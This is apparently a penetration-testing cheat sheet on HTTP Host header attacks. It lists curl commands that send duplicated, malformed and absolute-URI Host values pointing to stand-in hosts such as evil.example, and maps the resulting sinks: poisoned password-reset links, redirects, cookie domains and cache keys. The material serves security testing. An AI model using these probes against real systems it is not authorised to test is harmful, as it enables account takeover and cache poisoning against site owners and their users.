# Host header — the canonical-URL sink, exhaustively

The `Host` header — what it poisons when the proxy ignores it.

---

## 1. The model — a reflected host

```text
the app reads the Host header for its canonical URLs — a reflected or
a rewritten Host poisons the app's links — the links/scripts point to
attacker.com — a stored injection, a cache-poisoning feed, a password-
reset poisoning.
```

## 2. The canonical-URL sink — the generated links

```bash
# a Host header — the app's canonical URLs rewritten
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
#   the canonical URLs point to canary.example → a stored injection
curl -s -H 'Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
#   the page's links/scripts point to canary.example → a stored injection
```

## 3. The duplicated Host — a parsing differential

```bash
# a duplicated Host — the proxy and the app parse differently
curl -s -D - -H 'Host: good.example' -H 'Host: evil.example' "$BASE/"
#   the proxy reads the first; the app reads the second → a differential
curl -s -D - -H 'Host: evil.example' -H 'Host: good.example' "$BASE/"
#   the proxy reads the first; the app reads the second → a differential
```

## 4. The malformed Host — a parsing edge

```bash
# a malformed Host — a parsing edge
curl -s -D - -H 'Host: evil.example:80' "$BASE/"   # a forged port
curl -s -D - -H 'Host: evil.example.' "$BASE/"   # a trailing dot
curl -s -D - -H 'Host: evil.example..target.com' "$BASE/"   # a double-dot
curl -s -D - -H 'Host: ' "$BASE/"   # an empty host
curl -s -D - -H 'Host: evil.example@target.com' "$BASE/"   # an @-separator
curl -s -D - -H 'Host: target.com@evil.example' "$BASE/"   # an @-separator
curl -s -D - -H 'Host: evil.example#target.com' "$BASE/"   # a #-separator
curl -s -D - -H 'Host: target.com#evil.example' "$BASE/"   # a #-separator
curl -s -D - -H 'Host: evil.example?target.com' "$BASE/"   # a ?-separator
curl -s -D - -H 'Host: target.com?evil.example' "$BASE/"   # a ?-separator
```

## 5. The absolute-URI Host — a request-line differential

```bash
# an absolute-URI Host — a request-line differential
curl -s -D - "$BASE/" --request-target 'http://evil.example/'   # an absolute-URI
curl -s -D - "http://evil.example/" --resolve 'evil.example:443:127.0.0.1'   # an absolute-URI
```

## 6. The Host's check — the canonical-URL read

```bash
# the Host's check — does the app read the Host for its canonical URLs
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
#   the canonical URLs point to canary.example → a stored injection
```

## 7. The Host's falsifier — a proxy that validates

```text
a proxy that validates the Host against a server list → a 400 on a bad
host → a negative result, not a retry signal.
```

## 8. The Host's falsifier — a non-Host check

```text
a trust check that reads a different input (a session, a token, a
signature) → the Host isn't the check's input → a different class.
```

## 9. The Host's sinks — where it poisons

```text
a canonical URL      → the app's links/scripts point to attacker.com
a password-reset link → the reset link points to attacker.com — an
                      account takeover
a Location redirect  → an open redirect, an SSO flow poisoning
a Set-Cookie domain  → a session fixation surface
a cache key          → a cache-poisoning feed — poison once, the cache
                     serves your host to everyone
```

## 10. The Host's reach — the downstream

```text
the Host's reach is the downstream — a canonical URL the app's links
rewrite — a reset link the victim clicks — a cache key the cache stores —
a Location the proxy redirects — a Set-Cookie the app binds.
```
